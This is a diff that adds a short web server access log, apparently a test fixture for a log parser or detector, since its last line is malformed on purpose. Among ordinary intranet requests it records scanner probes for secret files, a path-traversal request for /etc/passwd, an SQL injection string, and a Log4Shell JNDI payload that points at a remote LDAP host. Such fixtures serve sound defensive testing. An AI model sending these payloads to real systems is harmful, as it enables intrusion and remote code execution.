@@ -1,0 +1,13 @@
+10.20.30.57 - - [14/Sep/2026:20:58:12 +0000] "GET / HTTP/1.1" 200 5120 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+10.20.30.57 - - [14/Sep/2026:20:58:13 +0000] "GET /css/site.css HTTP/1.1" 200 1830 "http://intranet.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+10.20.30.5 - - [14/Sep/2026:20:59:40 +0000] "GET /status HTTP/1.1" 200 12 "-" "Zabbix"
+203.0.113.45 - - [14/Sep/2026:21:05:00 +0000] "GET /wp-login.php HTTP/1.1" 404 196 "-" "Mozilla/5.0 zgrab/0.x"
+203.0.113.45 - - [14/Sep/2026:21:05:01 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 zgrab/0.x"
+203.0.113.45 - - [14/Sep/2026:21:05:01 +0000] "GET /.git/config HTTP/1.1" 404 196 "-" "Mozilla/5.0 zgrab/0.x"
+203.0.113.45 - - [14/Sep/2026:21:05:02 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 196 "-" "Mozilla/5.0 zgrab/0.x"
+203.0.113.45 - - [14/Sep/2026:21:05:03 +0000] "GET /download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1" 400 0 "-" "curl/8.5.0"
+203.0.113.45 - - [14/Sep/2026:21:05:04 +0000] "GET /search?q=%27%20OR%20%271%27%3D%271 HTTP/1.1" 500 312 "-" "sqlmap/1.8"
+198.51.100.23 - - [14/Sep/2026:21:07:10 +0000] "GET /?x=${jndi:ldap://198.51.100.23/a} HTTP/1.1" 400 0 "-" "Mozilla/5.0"
+10.20.30.57 - - [14/Sep/2026:21:10:44 +0000] "POST /login HTTP/1.1" 302 0 "http://intranet.example.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+10.20.30.57 - - [14/Sep/2026:21:10:45 +0000] "GET /dashboard HTTP/1.1" 200 8844 "http://intranet.example.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+this line is malformed on purpose
